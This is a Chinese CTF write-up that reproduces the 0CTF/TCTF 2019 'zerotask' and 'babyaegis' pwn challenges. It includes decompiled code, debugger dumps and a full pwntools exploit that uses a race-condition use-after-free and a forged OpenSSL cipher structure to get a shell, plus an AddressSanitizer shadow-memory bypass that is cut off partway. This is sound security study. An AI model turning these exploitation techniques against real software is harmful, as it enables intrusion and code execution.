    <url>%2F2019%2F03%2F26%2F2019-3-26-0CTFTCTF2019-PWN-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[很棒，不愧是腾讯搞的比赛，题目质量很高。然而自闭pwn手做自闭了，一个人看真的很容易看自闭。但是每次看到自闭了说不看了，结果过了会又回去看了，真香。这里赛后复现下pwn题。 zerotask防护机制： 1234567☁ zerotask [master] ⚡ checksec task [*] &apos;/home/zs0zrc/game/TCTF2019/pwn/zerotask_pwn/zerotask/task&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 题目一共给了三个文件，一个执行文件，两个动态链接库。 程序一共有三个功能，add_task添加任务，delete_task删除任务，go执行任务 add_task 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859task *add_task()&#123; task *result; // rax int choice; // [rsp+0h] [rbp-10h] int id; // [rsp+4h] [rbp-Ch] task *s; // [rsp+8h] [rbp-8h] printf("Task id : ", 0LL); id = read_int(); printf("Encrypt(1) / Decrypt(2): "); choice = read_int(); if ( choice != 1 &amp;&amp; choice != 2 ) return 0xFFFFFFFFLL; s = malloc(0x70uLL); memset(s, 0, 0x70uLL); if ( !sub_11A8(choice, s) ) return 0xFFFFFFFFLL; s-&gt;id = id; s-&gt;next = task_ptr; result = s; task_ptr = s; return result;&#125;signed __int64 __fastcall sub_11A8(int choice, task *buf)&#123; __int64 v3; // rsi __int64 v5; // [rsp+14h] [rbp-1Ch] printf("Key : ", buf); sub_F82(&amp;buf-&gt;type + 4, 32); printf("IV : ", 32LL); sub_F82(&amp;buf-&gt;KEY[28], 16); printf("Data Size : ", 16LL); v5 = read_int(); if ( v5 &lt;= 0 || v5 &gt; 4096 ) return 0LL; buf-&gt;size = v5; buf-&gt;ctx = EVP_CIPHER_CTX_new(); if ( choice == 1 ) &#123; v3 = EVP_aes_256_cbc(); EVP_EncryptInit_ex(buf-&gt;ctx, v3, 0LL, &amp;buf-&gt;type + 4, &amp;buf-&gt;KEY[28]); &#125; else &#123; if ( choice != 2 ) return 0LL; v3 = EVP_aes_256_cbc(); EVP_DecryptInit_ex(buf-&gt;ctx, v3, 0LL, &amp;buf-&gt;type + 4, &amp;buf-&gt;KEY[28]); &#125; LODWORD(buf-&gt;type) = choice; buf-&gt;data = malloc(buf-&gt;size); if ( !buf-&gt;data ) exit(1); printf("Data : ", v3); sub_F82(buf-&gt;data, buf-&gt;size); return 1LL;&#125; 主要功能是创建task，可以控制分配的明文空间的大小。这里有点坑的是 ida反编译的代码有点问题，就是 id和next字段的偏移会显示错误，看汇编可以看到next是在0x68的位置，但反编译的代码显示在0xd处……同时 sub_11A8函数的参数也会识别错误，需要自己修改下，我上面的是修改后的。 task结构体：(简陋的逆向了一个结构体) 12345678910111200000000 task struc ; (sizeof=0x70, mappedto_6)00000000 data dq ? ; offset00000008 size dq ?00000010 type dq ?00000018 KEY db 32 dup(?)00000038 IV db 16 dup(?)00000048 padding db 16 dup(?)00000058 ctx dq ? ; offset00000060 id dd ?00000064 field_64 dd ?00000068 next dq ? ; offset00000070 task ends delete 12345678910111213141516171819202122232425262728293031323334void delete()&#123; int idx; // [rsp+Ch] [rbp-14h] task *ptr; // [rsp+10h] [rbp-10h] task *v2; // [rsp+18h] [rbp-8h] ptr = task_ptr; v2 = task_ptr; printf("Task id : "); idx = read_int(); if ( task_ptr &amp;&amp; idx == *(task_ptr + 0x60) ) &#123; task_ptr = *(task_ptr + 0x68); EVP_CIPHER_CTX_free(ptr-&gt;ctx); free(ptr-&gt;data); free(ptr); &#125; else &#123; while ( ptr ) &#123; if ( idx == ptr-&gt;id ) &#123; v2-&gt;next = ptr-&gt;next; EVP_CIPHER_CTX_free(ptr-&gt;ctx); free(ptr-&gt;data); free(ptr); return; &#125; v2 = ptr; ptr = ptr-&gt;next; &#125; &#125;&#125; 将task的chunk释放掉，同时释放 ctx结构体以及申请的data空间。 go 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647unsigned __int64 encrypt()&#123; int v1; // [rsp+4h] [rbp-1Ch] pthread_t newthread; // [rsp+8h] [rbp-18h] task *arg; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf("Task id : "); v1 = read_int(); for ( arg = task_ptr; arg; arg = arg-&gt;next ) &#123; if ( v1 == arg-&gt;id ) &#123; pthread_create(&amp;newthread, 0LL, start_routine, arg); return __readfsqword(0x28u) ^ v4; &#125; &#125; return __readfsqword(0x28u) ^ v4;&#125;void __fastcall __noreturn start_routine(task *buf)&#123; int v1; // [rsp+14h] [rbp-2Ch] __int128 v2; // [rsp+18h] [rbp-28h] __int64 v3; // [rsp+28h] [rbp-18h] __int64 v4; // [rsp+30h] [rbp-10h] unsigned __int64 v5; // [rsp+38h] [rbp-8h] v5 = __readfsqword(0x28u); v2 = buf; v1 = 0; v3 = 0LL; v4 = 0LL; puts("Prepare..."); sleep(2u); memset(ciphertext, 0, 0x1010uLL); if ( !EVP_CipherUpdate(*(v2 + 0x58), ciphertext, &amp;v1, *v2, *(v2 + 8)) ) pthread_exit(0LL); *(&amp;v2 + 1) += v1; if ( !EVP_CipherFinal_ex(*(v2 + 88), ciphertext + *(&amp;v2 + 1), &amp;v1) ) pthread_exit(0LL); *(&amp;v2 + 1) += v1; puts("Ciphertext: "); sub_107B(stdout, ciphertext, *(&amp;v2 + 1), 0x10uLL, 1uLL); pthread_exit(0LL);&#125; go功能开启一个线程，根据输入的task_id，执行加密或者解密操作，然后将结果输出。漏洞也出现在这里，因为它开启线程后还sleep(2u)， 很明显的一个条件竞争漏洞…….我当时竟然看不出来，通过这个漏洞可以造成UAF 。 例如： 12go(1)delete(1) 通过UAF就可以泄露出heap和libc的地址了，不过因为它delete时会将ctx结构体也free掉，如果要泄露的话，delete后要重新创建一个task，不然会报错。 如下： 1234go(1)delete(1)add_task(1)#通过这个就可以泄露地址了 泄露heap地址: 12345678910111213141516171819def leak_heap(): add_task(1,2,0x90,'d'*0x90) add_task(10,1,0x90,'c'*0x90) add_task(11,1,0x90,'c'*0x90) delete(1) go(10) delete(10) add_task(10,1,0x90,'') p.recvuntil('text: \n') data = p.recvline('\n') data = data.replace(" ",'').strip() plain = mc.decrypt(data) heap_addr=u64(plain[:8]) heap_base = heap_addr - 0x14c0 p.send('a'*0x90) print hex(heap_base) return heap_base 泄露libc地址： 1234567891011121314151617def leak_libc(): add_task(20,1,0x410,'c'*0x410)#因为它是ubuntu18，由tcache,所以分配一个大小超出tcache范围的chunk来泄露libc地址 add_task(5,1,0x20,'c'*0x20) go(20) delete(20) add_task(20,1,0x410,'') p.recvuntil('text: \n') data = p.recvuntil('\n') data = data.replace(" ",'').strip() plain = mc.decrypt(data) leak_libc =u64(plain[:8]) - 0x3ebca0 libc_base = leak_libc libc.address = libc_base p.send('a'*0x410) print hex(libc_base) return libc_base 地址都泄露出来后，就要考虑怎么控制程序的执行流。这里因为是条件竞争造成的UAF，不能通过这个来构造overlapping chunk。这里通过UAF来劫持EVP_CIPHER_CTX结构体，通过伪造EVP_CIPHER_CTX结构体来劫持程序流。 EVP_CipherUpdate源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384int EVP_CipherUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl)&#123; if (ctx-&gt;encrypt) return EVP_EncryptUpdate(ctx, out, outl, in, inl); else return EVP_DecryptUpdate(ctx, out, outl, in, inl);&#125;int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl)&#123; /* Prevent accidental use of decryption context when encrypting */ if (!ctx-&gt;encrypt) &#123; EVPerr(EVP_F_EVP_ENCRYPTUPDATE, EVP_R_INVALID_OPERATION); return 0; &#125; return evp_EncryptDecryptUpdate(ctx, out, outl, in, inl);&#125;static int evp_EncryptDecryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, const unsigned char *in, int inl)&#123; int i, j, bl; if (ctx-&gt;cipher-&gt;flags &amp; EVP_CIPH_FLAG_CUSTOM_CIPHER) &#123; i = M_do_cipher(ctx, out, in, inl); //要劫持的目标 if (i &lt; 0) return 0; else *outl = i; return 1; &#125; if (inl &lt;= 0) &#123; *outl = 0; return inl == 0; &#125; if (ctx-&gt;buf_len == 0 &amp;&amp; (inl &amp; (ctx-&gt;block_mask)) == 0) &#123; if (M_do_cipher(ctx, out, in, inl)) &#123; *outl = inl; return 1; &#125; else &#123; *outl = 0; return 0; &#125; &#125; i = ctx-&gt;buf_len; bl = ctx-&gt;cipher-&gt;block_size; OPENSSL_assert(bl &lt;= (int)sizeof(ctx-&gt;buf)); if (i != 0) &#123; if (bl - i &gt; inl) &#123; memcpy(&amp;(ctx-&gt;buf[i]), in, inl); ctx-&gt;buf_len += inl; *outl = 0; return 1; &#125; else &#123; j = bl - i; memcpy(&amp;(ctx-&gt;buf[i]), in, j); if (!M_do_cipher(ctx, out, ctx-&gt;buf, bl)) return 0; inl -= j; in += j; out += bl; *outl = bl; &#125; &#125; else *outl = 0; i = inl &amp; (bl - 1); inl -= i; if (inl &gt; 0) &#123; if (!M_do_cipher(ctx, out, in, inl)) return 0; *outl += inl; &#125; if (i != 0) memcpy(ctx-&gt;buf, &amp;(in[inl]), i); ctx-&gt;buf_len = i; return 1;&#125; EVP_CIPHER_CTX结构体： 123456789101112131415161718struct evp_cipher_ctx_st &#123; const EVP_CIPHER *cipher; ENGINE *engine; /* functional reference if 'cipher' is * ENGINE-provided */ int encrypt; /* encrypt or decrypt */ int buf_len; /* number we have left */ unsigned char oiv[EVP_MAX_IV_LENGTH]; /* original iv */ unsigned char iv[EVP_MAX_IV_LENGTH]; /* working iv */ unsigned char buf[EVP_MAX_BLOCK_LENGTH]; /* saved partial block */ int num; /* used by cfb/ofb/ctr mode */ void *app_data; /* application stuff */ int key_len; /* May change for variable length cipher */ unsigned long flags; /* Various flags */ void *cipher_data; /* per EVP data */ int final_used; int block_mask; unsigned char final[EVP_MAX_BLOCK_LENGTH]; /* possible final block */&#125; /* EVP_CIPHER_CTX */ ; EVP_CIPHER结构体： 123456789101112131415161718192021222324252627struct evp_cipher_st &#123; int nid; int block_size; /* Default value for variable length ciphers */ int key_len; int iv_len; /* Various flags */ unsigned long flags; /* init key */ int (*init) (EVP_CIPHER_CTX *ctx, const unsigned char *key, const unsigned char *iv, int enc); /* encrypt/decrypt data */ int (*do_cipher) (EVP_CIPHER_CTX *ctx, unsigned char *out, const unsigned char *in, size_t inl); /* cleanup ctx */ int (*cleanup) (EVP_CIPHER_CTX *); /* how big ctx-&gt;cipher_data needs to be */ int ctx_size; /* Populate a ASN1_TYPE with parameters */ int (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *); /* Get parameters from a ASN1_TYPE */ int (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *); /* Miscellaneous operations */ int (*ctrl) (EVP_CIPHER_CTX *, int type, int arg, void *ptr); /* Application data */ void *app_data;&#125; /* EVP_CIPHER */ ; 通过查看源码可以发现一条调用链： EVP_CipherUpdate -&gt;EVP_EncryptUpdate-&gt;M_do_cipher 而 M_do_cipher实际上是对cipher+0x20处的函数指针的调用。所以具体利用思路是在堆中写入伪造的fake_cipher 结构体，fake_cipher结构体偏移0x20处填入one_gadget，前面的仿照之前的cipher就可以了。然后利用UAF, 劫持ctx结构体，使其 cipher字段指向伪造的fake_cipher结构体，最后getshell。 其实通过调试也可以发现EVP_CipherUpdate函数中存在一处相对调用，这里call [rax+0x20] ，rax是ctx结构体的cipher结构体的地址，而[rax+0x20] 则是 cipher中的 do_cipher函数指针。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118from pwn import*from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexcontext.log_level = "debug"#p = process('./task')p = remote("111.186.63.201",10001)libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')class Myencrypt(): def __init__(self,Key,IV): self.Key = Key self.IV = IV self.mode = AES.MODE_CBC def encrypt(self,data): cipher = AES.new(self.Key,self.mode,self.IV) length = 32 len_d = len(data) align = 0 if len_d%length !=0: align = length - len_d%length else: align = 0 data = data + align*'\0' self.enc = cipher.encrypt(data) return b2a_hex(self.enc) def decrypt(self,data): cipher = AES.new(self.Key,self.mode,self.IV) plain = cipher.decrypt(a2b_hex(data)) return plain.strip('\0') def add_task(idx,cmd,size,data=''): p.sendlineafter(":","1") p.sendlineafter(":",str(idx)) p.sendlineafter(":",str(cmd)) p.sendafter(":",'a'*0x20) p.sendafter(":",'b'*0x10) p.sendlineafter(":" , str(size)) p.sendafter(":", data) def delete(idx): p.sendlineafter("Choice: ","2") p.sendlineafter(":",str(idx))def go(idx): p.sendlineafter("Choice: ","3") p.sendlineafter(":",str(idx)) def leak_heap(): global heap_base add_task(1,2,0x8,'d'*0x8) add_task(2,1,0x8,'c'*0x8) add_task(3,1,0x8,'c'*0x8) delete(1) go(2) delete(2) add_task(2,1,0x8,'') p.recvuntil('text: \n') data = p.recvline('\n') data = data.replace(" ",'').strip() plain = mc.decrypt(data) heap_addr=u64(plain[:8]) heap_base = heap_addr - 0x14c0 p.send('a'*0x8) print hex(heap_base) return heap_basedef leak_libc(): add_task(20,1,0x410,'c'*0x410) add_task(5,1,0x20,'c'*0x20) go(20) delete(20) add_task(20,1,0x410,'') p.recvuntil('text: \n') data = p.recvuntil('\n') data = data.replace(" ",'').strip() plain = mc.decrypt(data) leak_libc =u64(plain[:8]) - 0x3ebca0 libc_base = leak_libc libc.address = libc_base p.send('a'*0x410) print hex(libc_base) return libc_base def get_shell(): one_gadget = 0x10a38c + libc.address success(hex(one_gadget)) fake_cipher = p64(0x10000001ab) + p64(0x1002) + p64(1) + p64(0) + p64(one_gadget) add_task(0x20,1,0x28,fake_cipher) add_task(11,1,0x20,'a'*0x20) add_task(12,1,0x70,'a'*0x70) add_task(13,1,0x20,'a'*0x20) go(12) delete(12) delete(11) add_task(11,1,0xa8,p64(heap_base + 0x24b0).ljust(0xa8,'\x00')) # control task_12 -&gt; ctx sleep(1) p.interactive("zs0zrc&gt;&gt;") #gdb.attach(p,"b EVP_CipherUpdate")heap_base = 0mc = Myencrypt('a'*0x20,'b'*0x10)#AES objectleak_heap()leak_libc()get_shell() babyaegis我看的第一道题就是这道，被7个防护机制惊呆了…….是我孤陋寡闻了。 防护机制：12345678910☁ aegis [master] ⚡ checksec aegis [*] &apos;/home/zs0zrc/game/TCTF2019/pwn/babyaegis_pwn/aegis/aegis&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ASAN: Enabled UBSAN: Enabled AddressSanitizer的前置知识其中我没见过的是ASAN和 UBSAN。 ASAN是指AddressSanitizer ，这是一款用于检测C/C++内存错误的工具。而UBSAN是指UndefinedBehaviorSanitizer , 这是一款用于检测未定义行为的检测器，比如使用没对齐的或者为空的指针什么的。 AddressSanitizer的基本功能： 123456789检测以下行为Use after free (dangling pointer dereference)Heap buffer overflowStack buffer overflowGlobal buffer overflowUse after returnUse after scopeInitialization order bugsMemory leaks AddressSanitizer的基本原理：文章链接 AddressSanitizer的官方文档：链接 AddressSanitizer会对程序中每8个字节内存映射到 shadow memory中对应的一个字节，对内存的读写操作都会对shadow memory对应的内存进行读取，判断内存读写操作是否合法。它检测bufferoverflower的算法思想也比较简单，通过在buffer两边分配Redzone，并且加上锁，如果这两块区域被访问了就说明overflower了。 shadow memory映射规则 shadow = (Mem&gt;&gt;3) + 0x7fff8000; 对于栈上的变量，会在它原来分配的内存两边分配额外的Redzone，并且将这两边区域内存加锁，不允许访问，如果被访问了就说明overflow了。 AddressSanitizer会hoo 住malloc和 free函数，使用它自己定义的分配函数。并且它分配的chunk头部0x10个字节是一些描述chunk状态的字段。不同size分配的内存区域不同， 0x10大小的内存分布都是从0x602000000010开始的，并且 free掉后的内存正常情况下是不会被再次分配的。 Chunkheader结构体 1234567891011121314151617181920struct ChunkHeader &#123; // 1-st 8 bytes. u32 chunk_state : 8; // Must be first. u32 alloc_tid : 24; u32 free_tid : 24; u32 from_memalign : 1; u32 alloc_type : 2; u32 rz_log : 3; u32 lsan_tag : 2; // 2-nd 8 bytes // This field is used for small sizes. For large sizes it is equal to // SizeClassMap::kMaxSize and the actual size is stored in the // SecondaryAllocator's metadata. u32 user_requested_size : 29; // align &lt; 8 -&gt; 0 // else -&gt; log2(min(align, 512)) - 2 u32 user_requested_alignment_log : 3; u32 alloc_context_id;&#125;; 基本功能分析：程序一共有五个功能 add note show note update note delete note secret 很明显是个菜单题，下面逐个分析函数 add note1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980unsigned __int64 __usercall add_note@&lt;rax&gt;(unsigned __int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)&#123; unsigned __int64 v3; // rdi __int64 v4; // rdx __int64 v5; // rcx __int64 v6; // r8 unsigned __int64 v7; // r9 int v8; // ST18_4 unsigned __int64 id; // rax unsigned __int64 v10; // rdi __int64 v11; // rax unsigned __int64 v12; // rdi unsigned __int64 v13; // rcx __int64 v14; // rcx unsigned __int64 v15; // rdi __int64 *v16; // rax unsigned __int64 v17; // rdi unsigned __int64 v18; // rdi __int64 buf; // [rsp+8h] [rbp-28h] signed int size; // [rsp+1Ch] [rbp-14h] signed int idx; // [rsp+20h] [rbp-10h] signed int i; // [rsp+24h] [rbp-Ch] idx = -1; for ( i = 0; i &lt; 10; ++i ) &#123; v3 = &amp;notes + 8 * i; if ( *((v3 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v3, a3); if ( !*v3 ) &#123; idx = i; break; &#125; &#125; if ( idx == -1 ) error(); printf("Size: "); size = read_int("Size: ", a2, v4, v5, v6, v7); if ( size &lt; 0x10 || size &gt; 0x400 ) error(); buf = malloc(size); if ( !buf ) error(); printf("Content: "); v8 = read_until_nl_or_max(buf, size - 8); printf("ID: "); id = read_ul(); v10 = v8 + buf; if ( *((v10 &gt;&gt; 3) + 0x7FFF8000) ) id = _asan_report_store8(v10); *v10 = id; v11 = malloc(&amp;word_10); v12 = &amp;notes + 8 * idx; if ( *((v12 &gt;&gt; 3) + 0x7FFF8000) ) v11 = _asan_report_store8(v12); *v12 = v11; v13 = &amp;notes + 8 * idx; if ( *((v13 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(&amp;notes + 8 * idx, a3); if ( !*v13 ) error(); v14 = buf; v15 = &amp;notes + 8 * idx; if ( *((v15 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v15, a3); v16 = *v15; if ( *((*v15 &gt;&gt; 3) + 0x7FFF8000LL) ) v16 = _asan_report_store8(v16); *v16 = v14; v17 = &amp;notes + 8 * idx; if ( *((v17 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v17, a3); v18 = *v17 + 8LL; if ( *((v18 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_store8(v18); *v18 = cfi_check; puts("Add success!"); return __readfsqword(0x28u);&#125; add note函数可以分配大小在0x10-0x400之间的note，最多分配10个note。 它的结构体： 1234struct note&#123; char *buf; void *func;&#125;; 分配一个0x10大小的note，观察它在内存中的情况。它包含两个指针，一个指向字符串的chunk，另一个指向ctf_check函数 123456789101112131415161718pwndbg&gt; x/10gx 0x557efd17ecc00x557efd17ecc0 &lt;notes&gt;: 0x0000602000000030 0x00000000000000000x557efd17ecd0 &lt;notes+16&gt;: 0x0000000000000000 0x00000000000000000x557efd17ece0 &lt;notes+32&gt;: 0x0000000000000000 0x00000000000000000x557efd17ecf0 &lt;notes+48&gt;: 0x0000000000000000 0x00000000000000000x557efd17ed00 &lt;notes+64&gt;: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/10gx 0x00006020000000000x602000000000: 0x02ffffff00000002 0x14800001200000100x602000000010: 0xef61616161616161 0xbe0123456789abcd0x602000000020: 0x02ffffff00000002 0x3b000001200000100x602000000030: 0x0000602000000010 0x0000557efc2e2ab00x602000000040: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/10gx 0x0000557efc2e2ab00x557efc2e2ab0 &lt;cfi_check&gt;: 0xccccccfffff25be9 0x0000000000841f0f0x557efc2e2ac0 &lt;__libc_csu_init&gt;: 0x41d7894956415741 0x2b1e258d4c5441550x557efc2e2ad0 &lt;__libc_csu_init+16&gt;: 0x2b362d8d48550023 0x8949fd89415300230x557efc2e2ae0 &lt;__libc_csu_init+32&gt;: 0x08ec8348e5294cf6 0xf06a0fe803fdc1480x557efc2e2af0 &lt;__libc_csu_init+48&gt;: 0xdb312074ed8548ff 0x0000000000841f0f show note1234567891011121314151617181920212223242526272829303132333435363738394041424344unsigned __int64 __usercall show_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)&#123; __int64 v3; // rdx __int64 v4; // rcx __int64 v5; // r8 unsigned __int64 v6; // r9 unsigned __int64 v7; // rdi unsigned __int64 v8; // rdi __int64 v9; // r14 __int64 v10; // rbx unsigned __int64 v11; // rbx __int64 v12; // rdx unsigned __int64 v14; // [rsp+8h] [rbp-28h] signed int v15; // [rsp+10h] [rbp-20h] printf("Index: "); v15 = read_int("Index: ", a2, v3, v4, v5, v6); if ( v15 &lt; 0 || v15 &gt;= 10 ) goto LABEL_20; v7 = &amp;notes + 8 * v15; if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v7, a3); if ( !*v7 )LABEL_20: error(); v8 = &amp;notes + 8 * v15; if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v8, a3); v14 = *v8; if ( *((*v8 &gt;&gt; 3) + 0x7FFF8000LL) ) _asan_report_load8(v14, a3); v9 = *v14; if ( *((v14 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v14, a3); v10 = *v14; if ( *((v14 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v14, a3); v11 = strlen(*v14) + v10 + 1; if ( *((v11 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v11, a3); v12 = *v11; printf("Content: %s\nID: %lu\n"); return __readfsqword(0x28u);&#125; 根据输入的id，打印对应note的内容。 delete note123456789101112131415161718192021222324252627282930313233343536unsigned __int64 __usercall delete_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)&#123; __int64 v3; // rdx __int64 v4; // rcx __int64 v5; // r8 unsigned __int64 v6; // r9 unsigned __int64 v7; // rdi unsigned __int64 v8; // rdi unsigned __int64 v9; // rdi unsigned __int64 v10; // rdi signed int v12; // [rsp+14h] [rbp-Ch] printf("Index: "); v12 = read_int("Index: ", a2, v3, v4, v5, v6); if ( v12 &lt; 0 || v12 &gt;= 10 ) goto LABEL_16; v7 = &amp;notes + 8 * v12; if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v7, a3); if ( !*v7 )LABEL_16: error(); v8 = &amp;notes + 8 * v12; if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v8, a3); v9 = *v8; if ( *((v9 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v9, a3); free(*v9); v10 = &amp;notes + 8 * v12; if ( *((v10 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v10, a3); free(*v10); puts("Delete success!"); return __readfsqword(0x28u);&#125; 删除note，并将对应的chunk释放掉，但是这里没有将指针清空，所以存在UAF。但是因为ASAN机制，所以利用不了，会报错，见下图。 update note1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465unsigned __int64 __usercall update_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;)&#123; __int64 v3; // rdx __int64 v4; // rcx __int64 v5; // r8 unsigned __int64 v6; // r9 unsigned __int64 v7; // rdi unsigned __int64 v8; // rdi __int64 v9; // rbx unsigned __int64 v10; // rsi __int64 v11; // rax unsigned __int64 v12; // rdi __asan *v13; // rdi void (__fastcall *v14)(_QWORD, unsigned __int64); // rbx unsigned __int64 v16; // [rsp+8h] [rbp-28h] int v17; // [rsp+18h] [rbp-18h] signed int v18; // [rsp+1Ch] [rbp-14h] printf("Index: "); v18 = read_int("Index: ", a2, v3, v4, v5, v6); if ( v18 &lt; 0 || v18 &gt;= 10 ) goto LABEL_29; v7 = &amp;notes + 8 * v18; if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v7, a3); if ( !*v7 )LABEL_29: error(); v8 = &amp;notes + 8 * v18; if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v8, a3); v16 = *v8; printf("New Content: "); if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v16, a3); v9 = *v16; if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v16, a3); v10 = strlen(*v16) + 1; v17 = read_until_nl_or_max(v9, v10);//overflow printf("New ID: "); v11 = read_ul(); if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) v11 = _asan_report_load8(v16, a3); v12 = v17 + *v16; if ( *((v12 &gt;&gt; 3) + 0x7FFF8000) ) v11 = _asan_report_store8(v12); *v12 = v11; v13 = (v16 + 8); if ( *(((v16 + 8) &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v13, a3); v14 = *v13; if ( *v13 != cfi_check ) &#123; _asan_handle_no_return(v13); _ubsan_handle_cfi_check_fail_abort(&amp;unk_34B100, v14); &#125; v14(v18, v10); puts("Update success!"); if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v16, a3); if ( *v16 &gt;&gt; 44 != 6LL ) error(); return __readfsqword(0x28u);&#125; 更新note的content和id。这里存在一个漏洞。在read_until_nl_or_max函数那里，它默认最后一位为null，但是如果我们读入max大小的字符串，那么content的内容就会和ID相连，strlen(*v16) + 1的值就会比content真正的长度大，会造成溢出。 但是因为asan的check机制，会报错并且退出。 secret12345678910111213141516171819202122unsigned __int64 secret()&#123; _BYTE *v0; // rax unsigned __int64 v2; // [rsp+0h] [rbp-10h] if ( secret_enable ) &#123; printf("Lucky Number: "); v2 = read_ul(); if ( v2 &gt;&gt; 44 ) v0 = (v2 | 0x700000000000LL); else v0 = v2; *v0 = 0; secret_enable = 0; &#125; else &#123; puts("No secret!"); &#125; return __readfsqword(0x28u);&#125; 这里读取一个地址，然后判断这个地址右移44位是否大于0，如果大于的话就将这个地址与x700000000000LL 进行或运算，然后往这个地址写入一个0。 AddressSanitizer的映射机制调试一下，感受一下AddressSanitizer机制 分配一个0x10大小的note_0 通过vmmap命令查看内存布局 其中0x10大小的chunk分配的起始地址在0x602000000010 123456pwndbg&gt; x/10gx 0x6020000000000x602000000000: 0x02ffffff00000002 0x6d00000120000010 ==&gt; chunk header0x602000000010: 0x0061616161616161 0xbe000000000000000x602000000020: 0x02ffffff00000002 0x7180000120000010 ==&gt; chunk header0x602000000030: 0x0000602000000010 0x000055ffd5a95ab00x602000000040: 0x02ffffff00000002 0x6d00000120000010 通过 shadow = addr &gt;&gt;3 + 0x7FFF8000 计算出chunk对应的shadow地址,然后去查看。这里使用中的chunk对应的Redzone的值为0，而fa代表 heap left redzone。这可以通过报错信息获得。 123456pwndbg&gt; x/10gx 0xc047fff80000xc047fff8000: 0x0000fafa0000fafa 0x0000fafa0000fafa0xc047fff8010: 0x0000fafa0000fafa 0xfafafafafafafafa0xc047fff8020: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8030: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8040: 0xfafafafafafafafa 0xfafafafafafafafa 将note_0 delete掉，此时对应的shadow redzone 被置为0xfd，表示free heap region。 123456pwndbg&gt; x/10gx 0xc047fff80000xc047fff8000: 0xfdfdfafafdfdfafa 0xfafafafafafafafa0xc047fff8010: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8020: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8030: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8040: 0xfafafafafafafafa 0xfafafafafafafafa 利用思路利用secret功能来实现update溢出 asan会对shadow memory进行检查，只要我们将下一个chunk的heap left redzone的值修改为0，那么溢出到下一个chunk就不会报错了。 shadow memory = 0x602000000020&gt;&gt;3 + 0x7fff8000 = 0xc047fff8004 通过secret修改下一个chunk的redzone 123456pwndbg&gt; x/10gx 0xc047fff80040xc047fff8004: 0xfafafafa0000fa00 0xfafafafafafafafa0xc047fff8014: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8024: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8034: 0xfafafafafafafafa 0xfafafafafafafafa0xc047fff8044: 0xfafafafafafafafa 0xfafafafafafafafa 泄露地址 改写redzone后，可以通过溢出修改下一个chunk的 chunk header。 结构体再看一波 1234567891011121314151617181920struct ChunkHeader &#123; // 1-st 8 bytes. u32 chunk_state : 8; // Must be first. u32 alloc_tid : 24; u32 free_tid : 24; u32 from_memalign : 1; u32 alloc_type : 2; u32 rz_log : 3; u32 lsan_tag : 2; // 2-nd 8 bytes // This field is used for small sizes. For large sizes it 